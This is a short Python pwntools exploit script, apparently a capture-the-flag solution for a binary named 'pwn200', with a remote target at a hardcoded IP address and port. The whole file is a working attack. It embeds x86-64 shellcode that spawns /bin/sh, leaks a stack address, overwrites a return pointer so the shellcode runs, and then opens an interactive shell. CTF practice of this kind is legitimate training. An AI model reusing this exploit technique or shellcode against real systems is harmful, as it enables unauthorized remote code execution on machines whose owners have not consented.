from pwn import *
DEBUG = 1
elf = ELF("./pwn200")
if DEBUG:
    context.log_level = 'debug'
    p = process("./pwn200")
else:
    #context.log_level = 'debug'
    p = remote("47.104.16.75",8997)

#get shell
shellcode = "\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05"
def exp():
    p.recvuntil("who")
    pad = 'x'*(0x30-len(shellcode))
    p.send(shellcode+pad)
    p.recvuntil(pad)
    leak_bp_addr = u64(p.recv(6)+"\0\0")
    print 'leak_bp_addr:%s\n'%(hex(leak_bp_addr))
    if DEBUG:
        pause()
    p.recvuntil("~~")
    write_addr = leak_bp_addr - 0x18
    ret_addr = write_addr - 0x38
    p.sendline("1")
    p.recvuntil("money~")
    p.send( p64(ret_addr) + shellcode + '0' * (0x40-len(shellcode)-0x10) + p64(write_addr))
    p.recvuntil("your choice :")
    p.sendline("3")
    p.interactive()
    

if __name__ == "__main__":
    exp()

